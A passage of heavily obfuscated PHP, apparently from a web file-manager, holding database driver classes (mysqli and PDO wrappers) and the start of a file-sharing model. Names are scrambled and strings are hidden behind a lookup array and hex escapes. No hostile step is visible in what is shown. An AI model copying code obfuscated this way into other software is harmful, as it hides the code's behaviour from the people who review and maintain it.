$˜ò±ıİí[12]), $˜ò±ıİí[37] => $”äÑ–«³[$˜ò±ıİí[38]], $˜ò±ıİí[39] => strtolower($”äÑ–«³[$˜ò±ıİí[40]]) == $˜ò±ıİí[41], $˜ò±ıİí[42] => strtolower($”äÑ–«³[$˜ò±ıİí[43]]) == $˜ò±ıİí[44]); } } return $Şòéª™¢; } public function getTables($äªş’Å² = '') { $ıâ£¾€Ä =& $_SERVER[Î‹ÃÂŞ„]; $şœœ¿Ô† = !empty($äªş’Å²) ? $ıâ£¾€Ä[953] . $äªş’Å² . $ıâ£¾€Ä[954] : $ıâ£¾€Ä[955]; $°¸·ª¦† = $this->query($şœœ¿Ô†); $‹«ò¶Ã… = array(); if ($°¸·ª¦†) { foreach ($°¸·ª¦† as $­à‚Ëø => $Àğ¨Ìµí) { $‹«ò¶Ã…[$­à‚Ëø] = current($Àğ¨Ìµí); } } return $‹«ò¶Ã…; } public function replace($ƒ Øœ€ú, $Í™ÌƒËÕ = array()) { $Õ©¸Á„ä =& $_SERVER[Î‹ÃÂŞ„]; foreach ($ƒ Øœ€ú as $ÜÀÚ³• => $¨¯òúÕ) { $ÃÆ‚ë ú = $this->parseValue($¨¯òúÕ); if (is_scalar($ÃÆ‚ë ú)) { $ø´ò“Ù[] = $ÃÆ‚ë ú; $€ãÛä¦[] = $this->parseKey($ÜÀÚ³•); } } $°Ñœßø· = $Õ©¸Á„ä[956] . $this->parseTable($Í™ÌƒËÕ[$Õ©¸Á„ä[325]]) . $Õ©¸Á„ä[957] . implode($Õ©¸Á„ä[50], $€ãÛä¦) . $Õ©¸Á„ä[958] . implode($Õ©¸Á„ä[50], $ø´ò“Ù) . $Õ©¸Á„ä[959]; return $this->execute($°Ñœßø·); } public function insertAll($®³…œÜ¥, $Ëµù°æƒ = array(), $—ïšÒ®™ = false) { $ıòİ‹Á =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($®³…œÜ¥[0])) { return !1; } $ú«¨¼£ = array_keys($®³…œÜ¥[0]); $ì³´¸Á = array(); foreach ($®³…œÜ¥ as $»£…®ÊÉ) { $’âĞïÌ = array(); foreach ($»£…®ÊÉ as $ÚŞ—µ„‰ => $¶˜â††ç) { $¶˜â††ç = $this->parseValue($¶˜â††ç); if (is_scalar($¶˜â††ç)) { $’âĞïÌ[] = $¶˜â††ç; } } $ì³´¸Á[] = $ıòİ‹Á[306] . implode($ıòİ‹Á[50], $’âĞïÌ) . $ıòİ‹Á[959]; } array_walk($ú«¨¼£, array($this, $ıòİ‹Á[960])); $ š–È— = $—ïšÒ®™ ? $ıòİ‹Á[961] : $ıòİ‹Á[962]; $ Â€©û¥ = $ š–È— . $ıòİ‹Á[963] . $this->parseTable($Ëµù°æƒ[$ıòİ‹Á[325]]) . $ıòİ‹Á[957] . implode($ıòİ‹Á[50], $ú«¨¼£) . $ıòİ‹Á[964] . implode($ıòİ‹Á[50], $ì³´¸Á); return $this->execute($ Â€©û¥); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Šë„Š„ =& $_SERVER[Î‹ÃÂŞ„]; $this->error = $this->_linkID->errno . $Šë„Š„[4] . $this->_linkID->error; if ($Šë„Š„[12] != $this->queryStr) { $this->error .= LNG($Šë„Š„[48]) . $this->queryStr; } think_trace($this->error, $Šë„Š„[12], $Šë„Š„[49]); return $this->error; } public function escapeString($ôàèë÷ë) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ôàèë÷ë); } else { return addslashes($ôàèë÷ë); } } public function parseKey(&$›ÔÀ×®, $®Íºƒ»– = true) { $¸Ïõ°Â =& $_SERVER[Î‹ÃÂŞ„]; if ($®Íºƒ»–) { $›ÔÀ×® = $this->parseKeyCheck($›ÔÀ×®); } if ($›ÔÀ×® != $¸Ïõ°Â[205] && !preg_match($¸Ïõ°Â[965], $›ÔÀ×®)) { $›ÔÀ×® = $¸Ïõ°Â[431] . trim($›ÔÀ×®, $¸Ïõ°Â[431]) . $¸Ïõ°Â[431]; } return $›ÔÀ×®; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($¡²Â±€¦ = '') { $Òõ¾îÅİ =& $_SERVER[Î‹ÃÂŞ„]; if (!class_exists($Òõ¾îÅİ[968])) { think_exception(think_lang($Òõ¾îÅİ[14]) . $Òõ¾îÅİ[969]); } if (!empty($¡²Â±€¦)) { $this->config = $¡²Â±€¦; if (empty($this->config[$Òõ¾îÅİ[17]])) { $this->config[$Òõ¾îÅİ[17]] = array(); } } } public function connect($–ûÂú§Ó = '', $€´ƒÀ¥Â = 0) { $…Ä¯¦½ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($this->linkID[$€´ƒÀ¥Â])) { if (empty($–ûÂú§Ó)) { $–ûÂú§Ó = $this->config; } $¢ğíğô« = !empty($–ûÂú§Ó[$…Ä¯¦½[17]][$…Ä¯¦½[18]]) ? $–ûÂú§Ó[$…Ä¯¦½[17]][$…Ä¯¦½[18]] : $this->pconnect; if ($¢ğíğô«) { $–ûÂú§Ó[$…Ä¯¦½[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$€´ƒÀ¥Â] = new PDO($–ûÂú§Ó[$…Ä¯¦½[970]], $–ûÂú§Ó[$…Ä¯¦½[942]], $–ûÂú§Ó[$…Ä¯¦½[943]], $–ûÂú§Ó[$…Ä¯¦½[17]]); } catch (PDOException $ïïÃîËÓ) { think_exception($ïïÃîËÓ->getMessage()); } $this->dbType = $this->_getDsnType($–ûÂú§Ó[$…Ä¯¦½[970]]); if (in_array($this->dbType, array($…Ä¯¦½[971], $…Ä¯¦½[972], $…Ä¯¦½[973], $…Ä¯¦½[974]))) { think_exception($…Ä¯¦½[975] . $this->dbType . $…Ä¯¦½[976] . $this->dbType . $…Ä¯¦½[977]); } if (!$this->linkID[$€´ƒÀ¥Â]) { think_exception($…Ä¯¦½[978]); } try { $this->linkID[$€´ƒÀ¥Â]->exec($…Ä¯¦½[979] . think_config($…Ä¯¦½[945])); } catch (Exception $ïïÃîËÓ) { } $this->connected = !0; if (1 != think_config($…Ä¯¦½[22])) { unset($this->config); } } return $this->linkID[$€´ƒÀ¥Â]; } public function free() { $this->PDOStatement = null; } public function query($ ´ëÖã³, $­Ÿµ¡´ü = array()) { $ÚşÒŠ—è =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ ´ëÖã³; if (!empty($­Ÿµ¡´ü)) { $this->queryStr .= $ÚşÒŠ—è[980] . print_r($­Ÿµ¡´ü, !0) . $ÚşÒŠ—è[981]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÚşÒŠ—è[23], 1); think_status($ÚşÒŠ—è[24]); $this->PDOStatement = $this->_linkID->prepare($ ´ëÖã³); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¬äÕ¶¾Ç = $this->PDOStatement->execute($­Ÿµ¡´ü); $this->debug(); if (!1 === $¬äÕ¶¾Ç) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ùëŒâ’¹, $§Ô£ÙÅ³ = array()) { $¢ÚÛËƒ =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ùëŒâ’¹; if (!empty($§Ô£ÙÅ³)) { $this->queryStr .= $¢ÚÛËƒ[980] . print_r($§Ô£ÙÅ³, !0) . $¢ÚÛËƒ[981]; } $ı’ìéáœ = !1; if ($this->dbType == $¢ÚÛËƒ[974]) { if (preg_match($¢ÚÛËƒ[982], $this->queryStr, $›µˆãí¸)) { $this->table = think_config($¢ÚÛËƒ[983]) . str_ireplace(think_config($¢ÚÛËƒ[984]), $¢ÚÛËƒ[424], $›µˆãí¸[2]); $ı’ìéáœ = (bool) $this->query($¢ÚÛËƒ[985] . strtoupper($this->table) . $¢ÚÛËƒ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¢ÚÛËƒ[25], 1); think_status($¢ÚÛËƒ[24]); $this->PDOStatement = $this->_linkID->prepare($ùëŒâ’¹); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Äù‡ê·ù = $this->PDOStatement->execute($§Ô£ÙÅ³); $this->debug(); if (!1 === $Äù‡ê·ù) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ı’ìéáœ || preg_match($¢ÚÛËƒ[986], $ùëŒâ’¹)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ı‚°íÓ¬ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ı‚°íÓ¬) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $øÛô¯Ç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$øÛô¯Ç) { $this->error(); return !1; } } return !0; } private function getAll() { $£–‚å®¥ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($£–‚å®¥); return $£–‚å®¥; } public function getFields($ş—ØöÉı) { $ªÏôîš =& $_SERVER[Î‹ÃÂŞ„]; $this->initConnect(!0); if (think_config($ªÏôîš[987])) { $·±‹•µƒ = str_replace($ªÏôîš[988], $ş—ØöÉı, think_config($ªÏôîš[987])); } else { switch ($this->dbType) { case $ªÏôîš[971]: case $ªÏôîš[989]: $·±‹•µƒ = "\x53\105\114\x45\x43\x54\40\x20\40\x63\x6f\x6c\x75\x6d\156\137\x6e\x61\x6d\145\x20\x61\x73\x20\47\116\141\x6d\145\47\54\x20\x20\40\144\141\x74\x61\x5f\164\x79\x70\x65\40\x61\163\40\47\x54\x79\x70\145\47\54\40\40\x20\x63\157\154\165\x6d\x6e\137\x64\x65\146\x61\x75\154\x74\40\141\x73\40\x27\x44\145\146\x61\x75\x6c\164\x27\54\40\40\40\151\x73\x5f\x6e\x75\154\x6c\141\x62\154\x65\40\x61\x73\40\47\116\165\x6c\x6c\47\xa\11\x9\106\122\x4f\x4d\x9\x69\x6e\146\157\162\x6d\141\x74\151\x6f\156\137\163\x63\150\x65\x6d\141\x2e\x74\x61\x62\x6c\x65\163\40\101\123\x20\164\12\x9\x9\112\117\x49\116\11\151\x6e\x66\157\162\155\141\164\151\157\x6e\137\163\x63\x68\145\155\x61\x2e\x63\x6f\x6c\165\155\156\x73\x20\101\123\40\143\xa\x9\11\x4f\116\40\40\164\x2e\164\141\142\154\145\137\143\141\x74\141\154\x6f\147\40\75\x20\x63\x2e\164\141\x62\154\x65\137\143\141\164\141\x6c\157\x67\12\11\x9\101\x4e\104\40\164\56\164\x61\142\154\x65\137\163\x63\x68\x65\x6d\x61\x20\75\x20\x63\x2e\x74\141\x62\154\x65\137\x73\143\x68\x65\x6d\141\12\x9\11\101\116\x44\40\x74\56\x74\141\x62\154\145\137\156\141\x6d\145\x20\x3d\x20\x63\56\x74\141\x62\154\145\137\x6e\141\155\x65\xa\11\11\127\110\x45\122\105\x20\40\40\x74\56\x74\141\x62\x6c\145\137\156\x61\155\145\40\75\x20\47{$ş—ØöÉı}\47"; break; case $ªÏôîš[990]: $·±‹•µƒ = $ªÏôîš[991] . $ş—ØöÉı . $ªÏôîš[992]; break; case $ªÏôîš[972]: case $ªÏôîš[974]: $·±‹•µƒ = $ªÏôîš[993] . $ªÏôîš[994] . $ªÏôîš[995] . strtoupper($ş—ØöÉı) . $ªÏôîš[996] . strtoupper($ş—ØöÉı) . $ªÏôîš[997]; break; case $ªÏôîš[998]: $·±‹•µƒ = $ªÏôîš[999] . $ş—ØöÉı . $ªÏôîš[1000]; break; case $ªÏôîš[973]: break; case $ªÏôîš[1001]: default: $·±‹•µƒ = $ªÏôîš[1002] . ($this->dbType == $ªÏôîš[1001] ? "\x60{$ş—ØöÉı}\140" : $ş—ØöÉı); } } $ä•ğû’Í = $this->query($·±‹•µƒ); $†ù˜»—ü = array(); if ($ä•ğû’Í) { foreach ($ä•ğû’Í as $§»ÑÆç¾ => $²â·ç´¤) { $²â·ç´¤ = array_change_key_case($²â·ç´¤); $²â·ç´¤[$ªÏôîš[32]] = isset($²â·ç´¤[$ªÏôîš[32]]) ? $²â·ç´¤[$ªÏôîš[32]] : $ªÏôîš[424]; $²â·ç´¤[$ªÏôîš[33]] = isset($²â·ç´¤[$ªÏôîš[33]]) ? $²â·ç´¤[$ªÏôîš[33]] : $ªÏôîš[424]; $±—çõ÷— = isset($²â·ç´¤[$ªÏôîš[319]]) ? $²â·ç´¤[$ªÏôîš[319]] : $²â·ç´¤[$ªÏôîš[32]]; $†ù˜»—ü[$±—çõ÷—] = array($ªÏôîš[32] => $±—çõ÷—, $ªÏôîš[33] => $²â·ç´¤[$ªÏôîš[33]], $ªÏôîš[35] => (bool) (isset($²â·ç´¤[$ªÏôîš[105]]) && $²â·ç´¤[$ªÏôîš[105]] === $ªÏôîš[12] || isset($²â·ç´¤[$ªÏôîš[35]]) && $²â·ç´¤[$ªÏôîš[35]] === $ªÏôîš[12]), $ªÏôîš[37] => isset($²â·ç´¤[$ªÏôîš[37]]) ? $²â·ç´¤[$ªÏôîš[37]] : (isset($²â·ç´¤[$ªÏôîš[56]]) ? $²â·ç´¤[$ªÏôîš[56]] : $ªÏôîš[424]), $ªÏôîš[39] => isset($²â·ç´¤[$ªÏôîš[96]]) ? strtolower($²â·ç´¤[$ªÏôîš[96]]) == $ªÏôîš[41] : (isset($²â·ç´¤[$ªÏôîš[57]]) ? $²â·ç´¤[$ªÏôîš[57]] : !1), $ªÏôîš[42] => isset($²â·ç´¤[$ªÏôîš[1003]]) ? strtolower($²â·ç´¤[$ªÏôîš[1003]]) == $ªÏôîš[44] : (isset($²â·ç´¤[$ªÏôîš[96]]) ? $²â·ç´¤[$ªÏôîš[96]] : !1)); } } return $†ù˜»—ü; } public function getTables($ú¬üõ¿¬ = '') { $Ú‡ß† =& $_SERVER[Î‹ÃÂŞ„]; if (think_config($Ú‡ß†[1004])) { $¥ã¾¶ÉÙ = str_replace($Ú‡ß†[1005], $ú¬üõ¿¬, think_config($Ú‡ß†[1004])); } else { switch ($this->dbType) { case $Ú‡ß†[972]: case $Ú‡ß†[974]: $¥ã¾¶ÉÙ = $Ú‡ß†[1006]; break; case $Ú‡ß†[971]: case $Ú‡ß†[989]: $¥ã¾¶ÉÙ = $Ú‡ß†[1007]; break; case $Ú‡ß†[998]: $¥ã¾¶ÉÙ = $Ú‡ß†[1008]; break; case $Ú‡ß†[973]: think_exception(think_lang($Ú‡ß†[1009]) . $Ú‡ß†[1010]); break; case $Ú‡ß†[990]: $¥ã¾¶ÉÙ = $Ú‡ß†[45] . $Ú‡ß†[46] . $Ú‡ß†[47]; break; case $Ú‡ß†[1001]: default: if (!empty($ú¬üõ¿¬)) { $¥ã¾¶ÉÙ = $Ú‡ß†[953] . $ú¬üõ¿¬ . $Ú‡ß†[954]; } else { $¥ã¾¶ÉÙ = $Ú‡ß†[955]; } } } $ªôœÜ¯© = $this->query($¥ã¾¶ÉÙ); $©†à·ß = array(); foreach ($ªôœÜ¯© as $²â×Í´ => $ôÆÙ»§) { $©†à·ß[$²â×Í´] = current($ôÆÙ»§); } return $©†à·ß; } protected function parseLimit($˜´«ÖÔÉ) { $”ûêÄ€ò =& $_SERVER[Î‹ÃÂŞ„]; $‚­âêâ˜ = $”ûêÄ€ò[12]; if (!empty($˜´«ÖÔÉ)) { switch ($this->dbType) { case $”ûêÄ€ò[998]: case $”ûêÄ€ò[990]: $˜´«ÖÔÉ = explode($”ûêÄ€ò[50], $˜´«ÖÔÉ); if (count($˜´«ÖÔÉ) > 1) { $‚­âêâ˜ .= $”ûêÄ€ò[51] . $˜´«ÖÔÉ[1] . $”ûêÄ€ò[52] . $˜´«ÖÔÉ[0] . $”ûêÄ€ò[53]; } else { $‚­âêâ˜ .= $”ûêÄ€ò[51] . $˜´«ÖÔÉ[0] . $”ûêÄ€ò[53]; } break; case $”ûêÄ€ò[971]: case $”ûêÄ€ò[989]: break; case $”ûêÄ€ò[973]: break; case $”ûêÄ€ò[972]: case $”ûêÄ€ò[974]: break; case $”ûêÄ€ò[1001]: default: $‚­âêâ˜ .= $”ûêÄ€ò[51] . $˜´«ÖÔÉ . $”ûêÄ€ò[53]; } } return $‚­âêâ˜; } public function parseKey(&$ªÏÈ÷, $ŒŒœ‘ ˜ = true) { $ ÂŸøº =& $_SERVER[Î‹ÃÂŞ„]; if ($ŒŒœ‘ ˜) { $ªÏÈ÷ = $this->parseKeyCheck($ªÏÈ÷); } if ($this->dbType == $ ÂŸøº[1001]) { if ($ªÏÈ÷ != $ ÂŸøº[205] && !preg_match($ ÂŸøº[965], $ªÏÈ÷)) { $ªÏÈ÷ = $ ÂŸøº[431] . trim($ªÏÈ÷, $ ÂŸøº[431]) . $ ÂŸøº[431]; } return $ªÏÈ÷; } else { return parent::parseKey($ªÏÈ÷, $ŒŒœ‘ ˜); } } public function close() { $this->_linkID = null; } public function error() { $´¦§ºâ =& $_SERVER[Î‹ÃÂŞ„]; if ($this->PDOStatement) { $Ø•Åù«® = $this->PDOStatement->errorInfo(); $this->error = $Ø•Åù«®[1] . $´¦§ºâ[4] . $Ø•Åù«®[2]; } else { $this->error = $´¦§ºâ[12]; } if ($´¦§ºâ[12] != $this->queryStr) { $this->error .= LNG($´¦§ºâ[48]) . $this->queryStr; } think_trace($this->error, $´¦§ºâ[12], $´¦§ºâ[49]); return $this->error; } public function escapeString($©³¹·¨Ê) { $Õ±šŞı =& $_SERVER[Î‹ÃÂŞ„]; switch ($this->dbType) { case $Õ±šŞı[998]: case $Õ±šŞı[971]: case $Õ±šŞı[989]: case $Õ±šŞı[1001]: return addslashes($©³¹·¨Ê); case $Õ±šŞı[973]: case $Õ±šŞı[990]: case $Õ±šŞı[972]: case $Õ±šŞı[974]: return str_ireplace($Õ±šŞı[58], $Õ±šŞı[59], $©³¹·¨Ê); } } protected function parseValue($¬í–ÈÑ) { $¡€ú¯Êõ =& $_SERVER[Î‹ÃÂŞ„]; if (is_string($¬í–ÈÑ)) { $Çæá•»¢ = strpos($¬í–ÈÑ, $¡€ú¯Êõ[4]) === 0 && in_array($¬í–ÈÑ, array_keys($this->bind)); $¬í–ÈÑ = $Çæá•»¢ ? $this->escapeString($¬í–ÈÑ) : $¡€ú¯Êõ[1011] . $this->escapeString($¬í–ÈÑ) . $¡€ú¯Êõ[1011]; } elseif (isset($¬í–ÈÑ[0]) && is_string($¬í–ÈÑ[0]) && strtolower($¬í–ÈÑ[0]) == $¡€ú¯Êõ[343]) { $¬í–ÈÑ = $this->escapeString($¬í–ÈÑ[1]); } elseif (is_array($¬í–ÈÑ)) { $¬í–ÈÑ = array_map(array($this, $¡€ú¯Êõ[1012]), $¬í–ÈÑ); } elseif (is_bool($¬í–ÈÑ)) { $¬í–ÈÑ = $¬í–ÈÑ ? $¡€ú¯Êõ[90] : $¡€ú¯Êõ[214]; } elseif (is_null($¬í–ÈÑ)) { $¬í–ÈÑ = $¡€ú¯Êõ[105]; } return $¬í–ÈÑ; } public function getLastInsertId() { $ğ€‡èää =& $_SERVER[Î‹ÃÂŞ„]; switch ($this->dbType) { case $ğ€‡èää[998]: case $ğ€‡èää[990]: case $ğ€‡èää[971]: case $ğ€‡èää[989]: case $ğ€‡èää[973]: case $ğ€‡èää[1001]: return $this->_linkID->lastInsertId(); case $ğ€‡èää[972]: case $ğ€‡èää[974]: $ÑãÊÈƒ = $this->table; $ƒäìÖ® = $this->query("\123\x45\x4c\105\103\x54\x20{$ÑãÊÈƒ}\x2e\x63\x75\x72\x72\x76\141\154\x20\143\x75\162\x72\x76\141\x6c\40\106\x52\117\115\40\x64\x75\x61\x6c"); return $ƒäìÖ® ? $ƒäìÖ®[0][$ğ€‡èää[1013]] : 0; } } } goto E–õÜÈì»ø; d¥öù±££É: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\124\x69\x6d\x65", "\164\x69\x6d\x65", "\151\156\163\x65\x72\164\x2c\165\x70\144\x61\164\145", "\x66\x75\x6e\x63\164\x69\157\156"), array("\x63\x72\145\x61\164\145\x54\x69\x6d\145", "\x74\151\x6d\145", "\151\156\x73\145\x72\x74", "\x66\165\x6e\x63\164\151\x6f\156"), array("\157\x70\164\151\x6f\x6e\163", '', "\x69\156\163\145\x72\164\x2c\x75\x70\x64\x61\164\x65\54\x73\145\154\145\143\x74", "\152\x73\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ç±·°çÅ) { $¢‚¤ï…» =& $_SERVER[Î‹ÃÂŞ„]; $âš²Õ¼½ = isset($ç±·°çÅ[0]) ? $ç±·°çÅ[0] : !1; return array($¢‚¤ï…»[2042] => array(USER_ID, $¢‚¤ï…»[2043]), $¢‚¤ï…»[1982] => array($âš²Õ¼½, $¢‚¤ï…»[2044])); } protected function listSimple() { $»ş”£Üò = array($_SERVER[Î‹ÃÂŞ„][1704] => USER_ID); $˜ƒ¤æ¶¦ = $this->field($this->fieldList)->where($»ş”£Üò)->select(); return $˜ƒ¤æ¶¦ ? $˜ƒ¤æ¶¦ : array(); } protected function getInfo($›¥‹ªàØ, $‹Å²´àã = false) { $íıØÂ¡ =& $_SERVER[Î‹ÃÂŞ„]; if ($‹Å²´àã) { return $this->_getShareInfo(array($íıØÂ¡[636] => $›¥‹ªàØ)); } $œ»›Õ” = $this->cacheFunctionGet($íıØÂ¡[1984], $›¥‹ªàØ); return $œ»›Õ”; } public function getInfoByHash($ô©ÚÑÚ“) { return $this->_getShareInfo(array($_SERVER[Î‹ÃÂŞ„][2045] => $ô©ÚÑÚ“)); } public function getInfoByPath($ˆéâºå°) { $ÓÅïÕ Ÿ =& $_SERVER[Î‹ÃÂŞ„]; $«ûÈĞ·â = array($ÓÅïÕ Ÿ[1704] => USER_ID, $ÓÅïÕ Ÿ[183] => $ˆéâºå°); return $this->_getShareInfo($«ûÈĞ·â); } public function getInfoBySourcePath($æË’‰¹) { $ö¨„ü¶Õ =& $_SERVER[Î‹ÃÂŞ„]; $Š¼™¦ = array($ö¨„ü¶Õ[1704] => USER_ID, $ö¨„ü¶Õ[1230] => $æË’‰¹); return $this->_getShareInfo($Š¼™¦); } private function _getShareInfo($…èİÍûú) { $–à¬Åæ =& $_SERVER[Î‹ÃÂŞ„]; $ÇŠñÚÂÅ = $this->where($…èİÍûú)->find(); if (!$ÇŠñÚÂÅ) { return !1; } $…èİÍûú = array($–à¬Åæ[636] => $ÇŠñÚÂÅ[$–à¬Åæ[636]]); $óÔê¡ñ = $–à¬Åæ[2046]; $Î…Ïûğè = Model($–à¬Åæ[637])->order($–à¬Åæ[445])->field($óÔê¡ñ)->where($…èİÍûú)->select(); if ($ÇŠñÚÂÅ[$–à¬Åæ[183]] == $–à¬Åæ[214]) { $ÇŠñÚÂÅ[$–à¬Åæ[89]] = IO::info($ÇŠñÚÂÅ[$–à¬Åæ[1230]]); } else { $ÇŠñÚÂÅ[$–à¬Åæ[89]] = Model($–à¬Åæ[1388])->pathInfo($ÇŠñÚÂÅ[$–à¬Åæ[183]]); } $ÇŠñÚÂÅ[$–à¬Åæ[2047]] = $Î…Ïûğè; return $ÇŠñÚÂÅ; } protected function getInfoAuth($äÈÒ¿ñŸ) { $ üäãş =& $_SERVER[Î‹ÃÂŞ„]; $‘¡ØòÂ  = $this->getInfo($äÈÒ¿ñŸ); if ($‘¡ØòÂ [$ üäãş[1704]] == USER_ID) { $‘¡ØòÂ [$ üäãş[457]] = $‘¡ØòÂ [$ üäãş[89]][$ üäãş[457]]; } else { $‘¡ØòÂ [$ üäãş[457]] = Model($ üäãş[538])->authMake($‘¡ØòÂ [$ üäãş[2047]]); } return $‘¡ØòÂ ; } protected function listData($Ï˜ßÛÁæ = null, $î²´šªì = 300) { $¹¦¼ı“¸ =& $_SERVER[Î‹ÃÂŞ„]; $ Ö»×ß = array(array($¹¦¼ı“¸[533] => array($¹¦¼ı“¸[1067], 0), $¹¦¼ı“¸[634] => array($¹¦¼ı“¸[1067], 0), $¹¦¼ı“¸[2048] => $¹¦¼ı“¸[2000])); if ($Ï˜ßÛÁæ == $¹¦¼ı“¸[2049]) { $ Ö»×ß = array($¹¦¼ı“¸[533] => 1); } else { if ($Ï˜ßÛÁæ == $¹¦¼ı“¸[1216]) { $ Ö»×ß = array($¹¦¼ı“¸[634] => 1); } } $ Ö»×ß[$¹¦¼ı“¸[1704]] = USER_ID; $‹‹¶‡Òò = $this->where($ Ö»×ß)->selectPage($î²´šªì); return $‹‹¶‡Òò; } protected function listToMe($ıÖ¥İøÀ = 300) { $²‡‘Òõ¨ =& $_SERVER[Î‹ÃÂŞ„]; $ç÷Ã†ê½ = Model($²‡‘Òõ¨[2050])->userGroupParents(USER_ID); $õÏÅäª = array($²‡‘Òõ¨[619] => SourceModel::TYPE_USER, $²‡‘Òõ¨[541] => USER_ID); if ($ç÷Ã†ê½) { $õÏÅäª = array(array($²‡‘Òõ¨[619] => SourceModel::TYPE_USER, $²‡‘Òõ¨[541] => USER_ID), array($²‡‘Òõ¨[619] => SourceModel::TYPE_GROUP, $²‡‘Òõ¨[541] => array($²‡‘Òõ¨[7], $ç÷Ã†ê½)), $²‡‘Òõ¨[2048] => $²‡‘Òõ¨[2000]); } $åÖ« ‹„ = Model($²‡‘Òõ¨[637])->where($õÏÅäª)->selectPage($ıÖ¥İøÀ); $Ñö×üØ = array_to_keyvalue_group($åÖ« ‹„[$²‡‘Òõ¨[415]], $²‡‘Òõ¨[636]); if (!$Ñö×üØ) { return $åÖ« ‹„; } $öïñè‚ = $²‡‘Òõ¨[2051]; $õÏÅäª = array($²‡‘Òõ¨[636] => array($²‡‘Òõ¨[462], array_keys($Ñö×üØ)), $²‡‘Òõ¨[1704] => array($²‡‘Òõ¨[1069], $²‡‘Òõ¨[214])); $®˜›ˆíƒ = $this->field($öïñè‚)->where($õÏÅäª)->select(); foreach ($®˜›ˆíƒ as $¸“Ğ×½ => &$í¾¦Ëç) { $í¾¦Ëç[$²‡‘Òõ¨[2047]] = $Ñö×üØ[$í¾¦Ëç[$²‡‘Òõ¨[636]]]; } unset($í¾¦Ëç); $õñÚÎÕÙ = array($²‡‘Òõ¨[2052] => $®˜›ˆíƒ, $²‡‘Òõ¨[2053] => $åÖ« ‹„[$²‡‘Òõ¨[412]]); return $õñÚÎÕÙ; } protected function shareAdd($àïü©È, $µâÈ‰á) { $–Ï¿ÄûĞ =& $_SERVER[Î‹ÃÂŞ„]; $”é†¬•Å = $this->_addShareData($àïü©È, $µâÈ‰á); if (!empty($µâÈ‰á[$–Ï¿ÄûĞ[2054]])) { $this->_shareAuthSet($”é†¬•Å, $µâÈ‰á[$–Ï¿ÄûĞ[2054]]); } $this->shareEventAdd($àïü©È, $µâÈ‰á, $–Ï¿ÄûĞ[2055]); return $”é†¬•Å; } protected function shareAddSystem($°ÌÂ‹©Í, $ËÁ¹ÛÀ) { $”îıÚÕ =& $_SERVER[Î‹ÃÂŞ„]; $Â­ÉŒ¯Õ = $this->_addShareData($°ÌÂ‹©Í, $ËÁ¹ÛÀ, $”îıÚÕ[181]); $this->_shareAuthSet($Â­ÉŒ¯Õ, $ËÁ¹ÛÀ[$”îıÚÕ[2054]]); return $Â­ÉŒ¯Õ; } private function shareEventAdd($ó†È€ŒÖ, $Ú©åı¢Ç, $Í©Ú“«ï = "\141\x64\144") { $ïÆäšĞ =& $_SERVER[Î‹ÃÂŞ„]; if (!$ó†È€ŒÖ || $ó†È€ŒÖ == $ïÆäšĞ[214]) { return; } if ($Í©Ú“«ï == $ïÆäšĞ[2055]) { if ($Ú©åı¢Ç[$ïÆäšĞ[533]] == $ïÆäšĞ[90]) { Model($ïÆäšĞ[604])->eventShare($ó†È€ŒÖ, $ïÆäšĞ[2056]); } if ($Ú©åı¢Ç[$ïÆäšĞ[634]] == $ïÆäšĞ[90]) { Model($ïÆäšĞ[604])->eventShare($ó†È€ŒÖ, $ïÆäšĞ[2057]); } return; } $ÔÂş÷™ä = $this->getInfoByPath($ó†È€ŒÖ); $àÙ“ºµ› = $ïÆäšĞ[2058]; if ($ÔÂş÷™ä[$ïÆäšĞ[533]] == $ïÆäšĞ[214] && $Ú©åı¢Ç[$ïÆäšĞ[533]] == $ïÆäšĞ[90]) { $àÙ“ºµ› = $ïÆäšĞ[2056]; } if ($ÔÂş÷™ä[$ïÆäšĞ[533]] == $ïÆäšĞ[90] && $Ú©åı¢Ç[$ïÆäšĞ[533]] == $ïÆäšĞ[214]) { $àÙ“ºµ› = $ïÆäšĞ[2059]; } if ($ÔÂş÷™ä[$ïÆäšĞ[634]] == $ïÆäšĞ[214] && $Ú©åı¢Ç[$ïÆäšĞ[634]] == $ïÆäšĞ[90]) { $àÙ“ºµ› = $ïÆäšĞ[2057]; } if ($ÔÂş÷™ä[$ïÆäšĞ[634]] == $ïÆäšĞ[90] && $Ú©åı¢Ç[$ïÆäšĞ[634]] == $ïÆäšĞ[214]) { $àÙ“ºµ› = $ïÆäšĞ[2060]; } Model($ïÆäšĞ[604])->eventShare($ó†È€ŒÖ, $àÙ“ºµ›); return; } private function _addShareData($Ù¤û¥¡, $Æñ­õ¡ì = array(), $Ûë £á = false) { $·ÀÌœª¦ =& $_SERVER[Î‹ÃÂŞ„]; $èƒĞ·ùŠ = $Ûë £á == $·ÀÌœª¦[181] ? 0 : USER_ID; $Û¥Ü»ìÅ = array($·ÀÌœª¦[461] => $Ù¤û¥¡, $·ÀÌœª¦[1695] => $èƒĞ·ùŠ); if ($Ù¤û¥¡ == 0) { 